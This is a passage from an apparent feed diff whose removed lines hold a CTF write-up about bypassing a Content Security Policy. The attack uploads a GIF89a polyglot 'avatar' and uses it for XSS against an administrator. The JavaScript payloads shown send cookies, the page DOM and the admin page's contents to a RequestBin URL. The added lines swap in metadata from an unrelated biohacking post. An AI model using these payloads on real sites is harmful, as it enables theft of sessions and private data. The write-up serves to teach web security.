-&lt;p&gt;Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from &lt;code&gt;self&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.&lt;/p&gt;
-
-&lt;p&gt;Using the &lt;code&gt;GIF89a&lt;/code&gt; format (which conveniently starts with it&amp;#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &amp;#39;avatar&amp;#39; &lt;code&gt;pwn.gif&lt;/code&gt;, designed to steal cookies via &lt;a href=&quot;http://requestb.in/&quot;&gt;RequestBin&lt;/a&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://requestb.in/secretcode?c='&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &amp;#39;avatar&amp;#39; by sending myself a test message:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://example.com/uploads/filenamehash.gif&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;Refused to execute script from &amp;#39;&lt;a href=&quot;http://example.com/uploads/filenamehash.gif&quot;&gt;http://example.com/uploads/filenamehash.gif&lt;/a&gt;&amp;#39; because its MIME type (&amp;#39;image/gif&amp;#39;) is not executable.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that &lt;code&gt;HttpOnly&lt;/code&gt; flag first.. Sometimes I just get caught up in the heat of the moment.&lt;/p&gt;
-
-&lt;p&gt;Ok.. so we couldn&amp;#39;t steal the cookies.. but what could we do? &lt;a href=&quot;https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)&quot;&gt;Cross-Site Request Forgery (CSRF)&lt;/a&gt; maybe? There was a CSRF token designed to prevent this, but it didn&amp;#39;t seem to get validated. That&amp;#39;s good.. but what should we target?&lt;/p&gt;
-
-&lt;p&gt;Needing some better visibility on the situation, I decided to just steal the whole &lt;a href=&quot;https://en.wikipedia.org/wiki/Document_Object_Model&quot;&gt;DOM&lt;/a&gt; and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'textarea'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Capture the entire DOM and Base64 encode it */&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;documentElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Inject the form and send it */&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Ignoring my rusty JavsScript, the new payload would create a HTML &lt;code&gt;form&lt;/code&gt; element with a &lt;code&gt;textarea&lt;/code&gt;, grab the entire contents of the DOM, &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa&quot;&gt;Base64 encode&lt;/a&gt; them, stick them in the &lt;code&gt;textarea&lt;/code&gt;, inject the &lt;code&gt;form&lt;/code&gt; into the page, then send that off to RequestBin.&lt;/p&gt;
-
-&lt;p&gt;After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Sweet, let&amp;#39;s find something juicy on that page! Reworking the payload (with a little help from &lt;a href=&quot;https://api.jquery.com/jquery.get/&quot;&gt;JQuery&lt;/a&gt; that was already on the site):&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;GIF89a&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*.......*/&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cm&quot;&gt;/* Wait for the page to fully load */&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;cm&quot;&gt;/* Create a form to send to RequestBin */&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://requestb.in/secretcode&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Create a textarea to store our data */&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'textarea'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxPayload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Inject the form */&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;cm&quot;&gt;/* Load the admin page ajax-style, Base64 encode it, send it off */&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;haxForm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Using the last payload as the template, I updated it to load the &lt;code&gt;admin.php&lt;/code&gt; page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&amp;#39;t even a need to do anything else:&lt;/p&gt;
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;legend&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Administration&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/legend&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&amp;gt;&lt;/span&gt;flag{the-secret-flag-code}&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Mischief managed!&lt;/p&gt;
-
-&lt;h2&gt;Raw Notes&lt;/h2&gt;
-
-&lt;p&gt;I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Administrator is online&lt;/li&gt;
-&lt;li&gt;We can send messages to users&lt;/li&gt;
-&lt;li&gt;We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self&lt;/li&gt;
-&lt;li&gt;We can upload image files (can we make that other types?)
-
-&lt;ul&gt;
-&lt;li&gt;GIF89a based XSS, won&amp;#39;t exec in chrome though..&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Administrator will read messages we send them (check the &amp;#39;sent&amp;#39; page)&lt;/li&gt;
-&lt;li&gt;Admin isn&amp;#39;t using chrome! :p&lt;/li&gt;
-&lt;li&gt;The request doesn&amp;#39;t send us any cookies! :( (they&amp;#39;re HTTP only)&lt;/li&gt;
-&lt;li&gt;CSRF token doesn&amp;#39;t seem to actually be validated.. What can we CSRF..?&lt;/li&gt;
-&lt;li&gt;Use the XSS to send us the admin&amp;#39;s DOM&lt;/li&gt;
-&lt;li&gt;Seems there&amp;#39;s an admin.php page..&lt;/li&gt;
-&lt;li&gt;Ajax the admin page&lt;/li&gt;
-&lt;li&gt;Success!&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.&lt;/p&gt;
-
-&lt;p&gt;Has this helped you learn something new? Got a better way to approach it? I&amp;#39;d love to hear from you in the comments!&lt;/p&gt;
-
-&lt;h2&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Content Security Policy
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content Security Policy | OWASP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet&quot;&gt;Content Security Policy Cheat Sheet | OWASP&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/en/tutorials/security/content-security-policy/&quot;&gt;&amp;quot;An Introduction to Content Security Policy&amp;quot; by HTML5 Rocks&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://content-security-policy.com/&quot;&gt;Content Security Policy References and Examples&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;File Upload/Image XSS
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html&quot;&gt;&amp;quot;GIF Image XSS&amp;quot; by eXpl0i13r&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;http://brutelogic.com.br/blog/file-upload-xss/&quot;&gt;File Upload XSS | Hack2Learn&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;List of File Signatures | Wikipedia&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif&quot;&gt;&amp;quot;Exploiting PHP-GD imagecreatefromgif() function&amp;quot; by d0lph1n98 &lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Capturing Requests
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;https://requestb.in/&quot;&gt;Request Bin&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Glenn 'devalias' Grant</name></author><category term="hack" /><category term="ctf" /><category term="sectalks" /><category term="xss" /><category term="csrf" /><category term="file-upload" /><category term="image" /><category term="gif" /><category term="csp" /><category term="chrome" /><category term="safari" /><summary type="html">I was playing around with the top challenge on the CTF at SecTalks the other night, and thought I&amp;#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://devalias.net/assets/images/cover4.jpg" /></entry></feed>
+&lt;/ul&gt;</content><author><name>Glenn 'devalias' Grant</name></author><category term="quicknote" /><category term="bulletproof" /><category term="bulletproof-quarterly" /><category term="dave-asprey" /><category term="quarterly" /><category term="biohacking" /><summary type="html">So it&amp;#39;s that time again where biohacking christmas comes early (4 times a year!) Before I get into the content from this box, it seems Dave and the team have decided to move on from Quarterly and give the biohacking box a new home on biohacked.com. So if you want to find it, make sure you head over there and sign up!</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://devalias.net/assets/images/cover4.jpg" /></entry></feed>
